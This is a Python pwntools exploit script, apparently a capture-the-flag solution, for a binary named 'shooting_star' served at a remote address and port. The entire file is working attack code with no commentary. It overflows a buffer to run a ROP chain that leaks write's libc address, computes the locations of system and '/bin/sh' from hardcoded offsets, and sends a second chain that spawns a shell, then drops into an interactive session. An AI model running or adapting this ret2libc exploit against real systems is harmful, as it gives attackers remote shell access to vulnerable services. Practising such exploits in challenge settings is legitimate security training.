from pwn import *

address = '94.237.60.32'
port = 37656

context.binary = binary = ELF('./shooting_star')
rop = ROP(binary)

ret = p64(rop.find_gadget(['ret'])[0])
pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
pop_rsi_pop_r15 = p64(rop.find_gadget(['pop rsi', 'pop r15'])[0])

offset = b'A' * 72
main_addr = p64(binary.symbols.main)

write_plt = p64(binary.plt.write)
write_got = p64(binary.got.write)

write_offset = 0x110210
system_offset = 0x4f550
bin_sh_offset = 0x1b3e1a

payload = offset
payload += pop_rdi
payload += p64(1)
payload += pop_rsi_pop_r15
payload += write_got
payload += p64(0)
payload += write_plt
payload += main_addr

target = remote(address, port)

target.sendlineafter(b'> ', b'1')
target.sendlineafter(b'>> ', payload)
target.recvuntil(b'May your wish come true!\n')

write_libc = u64(target.recv(8))

print(hex(write_libc))

libc_addr = write_libc - write_offset
system_addr = p64(libc_addr + system_offset)
bin_sh_addr = p64(libc_addr + bin_sh_offset)

success(f'Base libc address: {hex(libc_addr)}')
success(f'system address: {hex(u64(system_addr))}')
success(f'/bin/sh address: {hex(u64(bin_sh_addr))}')

payload = offset
payload += pop_rdi
payload += bin_sh_addr
payload += system_addr

target.sendlineafter(b'> ', b'1')
target.sendlineafter(b'>> ', payload)
target.recv()
target.interactive()
